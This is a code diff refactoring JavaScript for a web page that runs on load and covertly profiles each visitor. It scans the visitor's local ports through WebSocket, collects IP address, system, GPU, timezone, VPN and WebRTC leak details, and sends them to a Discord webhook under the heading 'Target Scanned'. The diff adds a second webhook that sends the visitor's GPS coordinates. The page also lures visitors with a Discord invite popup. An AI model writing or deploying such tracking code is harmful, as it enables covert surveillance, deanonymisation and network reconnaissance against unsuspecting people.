@@ -1,11 +1,11 @@
-// Load config file
-fetch('config.json')
-    .then(response => response.json())
-    .then(config => {
-
-        asyncHandler = async () => {
-            const webhook_url = config.webhook_url;
-
+async function main() {
+    try {
+        const response = await fetch('config.json');
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        const config = await response.json();
+        const webhook_url = config.webhook_url;
 
             // Extended Operating System Detection
             function detectOperatingSystem(userAgent) {
@@ -77,33 +77,45 @@ fetch('config.json')
             // Function for port scanning with WebSocket
             function checkPort(port) {
                 return new Promise((resolve) => {
-                    var ws;
-                    var url = 'ws://localhost:' + port;
-                    var timeout = setTimeout(function () {
+                    let ws;
+                    const url = 'ws://localhost:' + port;
+                    const timeout = setTimeout(() => {
                         if (ws) {
                             ws.close();
                         }
-                        resolve(false); // port is closed or blocked
-                    }, 2000); // timeout in 2 seconds
+                        resolve({ port, isOpen: false }); // Port is closed or blocked
+                    }, 2000); // Timeout in 2 seconds
 
                     try {
                         ws = new WebSocket(url);
-                        ws.onopen = function () {
+                        ws.onopen = () => {
                             clearTimeout(timeout);
                             ws.close();
-                            resolve(true); // port is open
+                            resolve({ port, isOpen: true }); // Port is open
                         };
-                        ws.onerror = function () {
+                        ws.onerror = () => {
                             clearTimeout(timeout);
-                            resolve(false); // port is closed or blocked
+                            resolve({ port, isOpen: false }); // Port is closed or blocked
                         };
                     } catch (e) {
                         clearTimeout(timeout);
-                        resolve(false); // handle any exception
+                        resolve({ port, isOpen: false }); // Handle any exception
                     }
                 });
             }
 
+
+            // Function to send the second webhook if GPS location is shared
+            function sendLocationWebhook(ip, gpsText) {
+                var embeds = [{
+                    "title": "User Allowed Location Sharing",
+                    "description": `IP Address: ${ip}\nGPS Location: ${gpsText}`,
+                    "color": 65280 
+                }];
+            
+                sendDiscordMessage(embeds);
+            }
+            
 
             //Main function for processing
             async function getLocationAndGPSData() {
@@ -112,8 +124,14 @@ fetch('config.json')
                 var portsToCheck = [53, 80, 443, 995, 8080, 8081, 2222, 5001, 50000, 8443, 2086, 5555, 25565, 554, 1935, 21, 22, 23, 25, 110, 143, 3306, 3389, 5900, 55443, 10001];
             
                 try {
-                    const portResults = await Promise.all(portsToCheck.map(port => checkPort(port)));
-                    console.log('Port check results:', portResults);
+                    const portResults = await Promise.allSettled(portsToCheck.map(port => checkPort(port)));
+
+                    // Filter to only include open ports
+                    const openPorts = portResults
+                        .filter(result => result.status === 'fulfilled' && result.value.isOpen)
+                        .map(result => result.value.port);
+                    
+                    console.log('Open ports:', openPorts);
             
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     if (!ipResponse.ok) {
@@ -145,19 +163,18 @@ fetch('config.json')
             
                     var gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
             
-                    sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue, portResults, portsToCheck);
+                    sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue, openPorts);
                     messageSent = true; // Set the flag to true after sending the message
             
                     // Additional data send on geolocation permission
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             function (position) {
-                                if (messageSent) {
-                                    return;
-                                }
                                 var gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
                                 var gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;
-                                sendDiscordEmbed(location, gpsText, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone, gpuValue, portResults, portsToCheck);
+
+                                // Call the function to send the new webhook
+                                sendLocationWebhook(ip, gpsText);
                             },
                             function (error) {
                                 console.error('Geolocation error:', error);
@@ -165,11 +182,12 @@ fetch('config.json')
                             { timeout: 10000 }
                         );
                     }
+
                 } catch (error) {
-                    console.error('Error:', error);
-                    handleErrorType('unknown', 'Error: ' + error.message, userTimezone);
+                    // Handle errors that occur within the try block
+                    console.error('Error in getLocationAndGPSData:', error);
                 }
-            }
+            }                
             
             function getLocationValue(location) {
                 if (location.region == null) {
@@ -307,20 +325,17 @@ fetch('config.json')
     
     
             // Function to send message to Discord
-            function sendDiscordEmbed(_location_, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue, portResults, portsToCheck) {
+            function sendDiscordEmbed(_location_, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone, gpuValue, openPorts) {
                 var additionalDetails = getAdditionalDetails();
-
                 var portStatusString = "No open ports detected";
-                if (Array.isArray(portResults)) {
-                    const openPorts = portResults
-                        .map((isOpen, index) => isOpen ? `[Port ${portsToCheck[index]}](http://${location.ip}:${portsToCheck[index]})` : null)
-                        .filter(port => port !== null);
             
-                    if (openPorts.length > 0) {
-                        portStatusString = openPorts.join('\n');
-                    }
+                // Construct port status string based on open ports
+                if (openPorts && openPorts.length > 0) {
+                    portStatusString = openPorts
+                        .map(port => `[Port ${port}](http://${_location_.ip}:${port})`)
+                        .join('\n');
                 }
-
+            
                 var embeds = [{
                     "title": "Target Scanned",
                     "color": 65280,
@@ -336,7 +351,7 @@ fetch('config.json')
                             "inline": true
                         },
                         {
-                            "name": "GPS Coordinates",
+                            "name": "IP Location",
                             "value": gpsValue ? gpsValue : "Unknown",
                             "inline": true
                         },
@@ -474,6 +489,7 @@ fetch('config.json')
                     });
             }
     
+
             // Function to show the popup
             function showPopup() {
                 var popup = document.getElementById('discordPopup');
@@ -487,17 +503,15 @@ fetch('config.json')
                 window.location.href = 'https://discord.gg/thepirates';
             }
     
-            // Attach the acceptInvite function to the global window object
+
+            // Run these functions on page load
+            await getLocationAndGPSData();
+            setTimeout(showPopup, 3000);
             window.acceptInvite = acceptInvite;
     
-            // Run these functions on page load
-            getLocationAndGPSData();
-            setTimeout(showPopup, 3000);
-
+        } catch (error) {
+            console.error('Error occurred:', error);
         }
-        asyncHandler();
-
-    })
-    .catch(error => {
-        console.error('Error loading configuration:', error);
-    });
+    }
+    
+    main();
